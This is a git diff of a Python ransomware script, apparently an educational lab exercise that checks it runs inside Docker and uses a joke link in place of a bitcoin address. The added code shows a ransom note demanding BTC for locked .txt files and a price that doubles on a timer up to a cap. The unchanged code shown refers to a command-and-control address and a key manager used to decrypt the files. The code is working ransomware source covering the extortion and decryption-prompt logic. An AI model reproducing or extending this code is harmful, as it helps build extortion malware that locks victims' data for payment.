@@ -11,7 +11,7 @@ import threading,time
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
-ENCRYPT_MESSAGE = """
+AMOGUS = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
@@ -27,11 +27,13 @@ ENCRYPT_MESSAGE = """
 ⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
 ⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
 ⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⢠⣿⣿⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿   ⠀⠀⢸⣿⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿   ⠀⢸⣿⡇⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿ ⠀⠈⠻⣿⣿⣿⣿⡿⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-Your txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data. 
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+ENCRYPT_MESSAGE = """\rYour txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data and send {price} BTC to the following address: {address}
+The price will be multiplied by 2 every 24 hours.
 """
 
 decrypt_message = """
@@ -58,9 +60,15 @@ Your txt files have been unlocked.
 """
 
 class Ransomware:
+    DOUBLE_TIME = 60 # Every 60 seconds, the price will be multiplied by 2
+    MAX_PRICE = 1024 # Prix maximum
+    BITCOIN_ADDRESS = "https://www.youtube.com/watch?v=v1PBptSDIh8" # I don't have a bitcoin address, so I put a link to a video 
     def __init__(self) -> None:
         self.check_hostname_is_docker()
-        self.hex_token = None
+        self.hex_token = None # token in hex
+        self.timestamp = None # in seconds
+
+        self.timestamp = int(time.time())
     
     def check_hostname_is_docker(self)->None:
         # At first, we check if we are in a docker
@@ -103,41 +111,45 @@ class Ransomware:
 
 
 
-
+    #  Actualise régulièrement le prix de la rançon 
     def countdown(self):
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(ENCRYPT_MESSAGE.format(token=self.hex_token))
-        start_time = time.time()
-        duration = 10
-
-        while time.time() - start_time < duration:
-            time_remaining = duration - (time.time() - start_time)
-            sys.stdout.write(f"\rTime remaining: {time_remaining:.0f} seconds")
-            sys.stdout.flush()
-            time.sleep(1)
-
-
-    def get_input_key(self):
+        print(AMOGUS.format())
         while True:
-            self.input_key = input("\nEnter the decryption key: ")
+            price = 1 * 2 ** (int(time.time() - self.timestamp) // self.DOUBLE_TIME)
+            if price > self.MAX_PRICE:
+                price = self.MAX_PRICE
+            print(ENCRYPT_MESSAGE.format(token=self.hex_token, price=price, address=self.BITCOIN_ADDRESS))
+            
+            # Afficher le message pour entrer la clé de déchiffrement
+            print("\nEnter the decryption key:", end=" ")
+            sys.stdout.flush()
 
+            time.sleep(2)
+
+            # Remonter d'une ligne pour réécrire le temps restant à la prochaine itération
+            sys.stdout.write("\033[5A")
+            sys.stdout.flush()
 
     def decrypt(self):
+
+
         # Load cryptographic elements and the list of encrypted files
         secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         secret_manager.load()
-        encrypted_files = self.get_files("*.txt")
 
-        # print token to the user
         self.hex_token = secret_manager.get_hex_token()
 
-        thread = threading.Thread(target=self.countdown)
-        thread.start()
+        encrypted_files = self.get_files("*.txt")
+
+
+        thread_countdown = threading.Thread(target=self.countdown)
+        thread_countdown.start()
 
         while True:
             try:
                 # Ask for the key
-                b64_key = input("Enter the decryption key: ")
+                b64_key = input("")
                 # Set the key
                 secret_manager.set_key(b64_key)
 
@@ -154,11 +166,19 @@ class Ransomware:
                 # Exit the ransomware
                 break
             except ValueError as e:
-                print(f"Error: {e}. Please provide a valid decryption key.")
+                print(f"\nPlease provide a valid decryption key.", end="")
+                sys.stdout.write("\033[2A")
+                sys.stdout.flush()
+                #clear the full line
+                sys.stdout.write("\033[2K")
+                sys.stdout.flush()
+                #reprint the message
+                print("\rEnter the decryption key:", end="")
                 pass
             except Exception as e:
-                print(f"Unexpected error occurred during decryption: {e}")
+                print(f"\nUnexpected error occurred during decryption")
                 break
+
 
 
 if __name__ == "__main__":
